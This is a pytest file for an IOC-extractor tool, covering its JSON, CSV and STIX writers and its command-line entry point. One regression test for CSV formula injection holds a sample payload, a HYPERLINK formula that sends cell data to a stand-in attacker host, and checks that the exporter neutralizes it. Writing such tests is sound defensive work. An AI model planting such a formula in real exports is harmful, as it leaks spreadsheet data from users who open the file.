"""Tests for output serializers and the CLI entry point."""

from __future__ import annotations

import io as stdlib_io
import json
import sys
from pathlib import Path

import pytest

from ioc_extractor.cli import main
from ioc_extractor.core.extractor import extract
from ioc_extractor.io.writers import to_csv, to_json, to_stix_bundle

TEXT = "Beacon to 1.2.3.4 and evil.example.com, hash 44d88612fea8a8f36de82e1278abb02f"


def test_to_json_round_trips_structure() -> None:
    result = extract(TEXT)
    parsed = json.loads(to_json(result))
    assert parsed["source"] == "<memory>"
    assert isinstance(parsed["iocs"], list)
    assert len(parsed["iocs"]) == len(result.iocs)


def test_to_csv_has_header_and_rows() -> None:
    result = extract(TEXT)
    csv_text = to_csv(result)
    lines = csv_text.strip().splitlines()
    assert lines[0] == "type,value,was_defanged,context"
    assert len(lines) == 1 + len(result.iocs)


def test_to_stix_bundle_produces_valid_json() -> None:
    result = extract(TEXT)
    bundle = json.loads(to_stix_bundle(result))
    assert bundle["type"] == "bundle"
    assert all(obj["type"] == "indicator" for obj in bundle["objects"])


def test_to_stix_bundle_skips_types_with_no_stix_mapping() -> None:
    """CVE, BTC_ADDRESS, and FILE_PATH have no STIX SCO mapping in this
    lightweight emitter and must be silently skipped rather than error."""
    result = extract("CVE-2023-4863 and wallet 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    bundle = json.loads(to_stix_bundle(result))
    assert bundle["objects"] == []


def test_to_csv_neutralizes_formula_injection_payload() -> None:
    """Regression test for CSV/formula injection (CWE-1236).

    A crafted threat report can place a formula like
    '=HYPERLINK("http://evil.example/steal?d="&A1)' directly adjacent to
    an IOC; that text flows into the `context` field verbatim. Before the
    fix, opening the exported CSV in Excel/Sheets would execute it as a
    live formula. The fix prefixes any cell starting with =, +, -, @, tab,
    or CR with a single quote so spreadsheet applications treat it as text.
    """
    payload = '=HYPERLINK("http://evil.example/steal?d="&A1) C2 IP: 1.2.3.4'
    result = extract(payload)
    csv_text = to_csv(result)
    data_lines = csv_text.strip().splitlines()[1:]
    assert data_lines, "expected at least one extracted IOC row"
    for line in data_lines:
        first_cell = line.split(",")[0]
        assert not first_cell.startswith("="), f"unsanitized formula leaked: {line!r}"
    assert "'=HYPERLINK" in csv_text


def test_cli_reads_file_and_writes_json_output(tmp_path: Path) -> None:
    input_file = tmp_path / "report.txt"
    input_file.write_text(TEXT, encoding="utf-8")
    output_file = tmp_path / "out.json"

    exit_code = main([str(input_file), "-f", "json", "-o", str(output_file)])

    assert exit_code == 0
    parsed = json.loads(output_file.read_text(encoding="utf-8"))
    assert parsed["source"] == str(input_file)
    assert len(parsed["iocs"]) > 0


def test_cli_missing_file_prints_clean_error_not_traceback(capsys: object) -> None:
    """Regression test: a nonexistent input path previously propagated a raw
    FileNotFoundError traceback to the user. It must now print a one-line
    error to stderr and return exit code 1."""
    exit_code = main(["/nonexistent/path/report.txt"])
    assert exit_code == 1
    captured = capsys.readouterr()  # type: ignore[attr-defined]
    assert "error" in captured.err.lower()
    assert "Traceback" not in captured.err


def test_cli_unwritable_output_path_prints_clean_error(tmp_path: Path, capsys: object) -> None:
    input_file = tmp_path / "report.txt"
    input_file.write_text(TEXT, encoding="utf-8")
    # A directory can never be written to as if it were a file.
    bad_output = tmp_path / "not_a_file_dir"
    bad_output.mkdir()

    exit_code = main([str(input_file), "-o", str(bad_output)])

    assert exit_code == 1
    captured = capsys.readouterr()  # type: ignore[attr-defined]
    assert "error" in captured.err.lower()
    assert "Traceback" not in captured.err


def test_cli_writes_to_stdout_when_no_output_path_given(capsys: object) -> None:
    old_stdin = sys.stdin
    try:
        sys.stdin = stdlib_io.StringIO(TEXT)
        code = main([])
    finally:
        sys.stdin = old_stdin

    assert code == 0
    captured = capsys.readouterr()  # type: ignore[attr-defined]
    parsed = json.loads(captured.out)
    assert parsed["source"] == "<stdin>"
    assert len(parsed["iocs"]) > 0


def test_cli_version_flag_exits_cleanly(capsys: object) -> None:
    with pytest.raises(SystemExit) as exc_info:
        main(["--version"])
    assert exc_info.value.code == 0
    captured = capsys.readouterr()  # type: ignore[attr-defined]
    assert "ioc-extractor" in captured.out
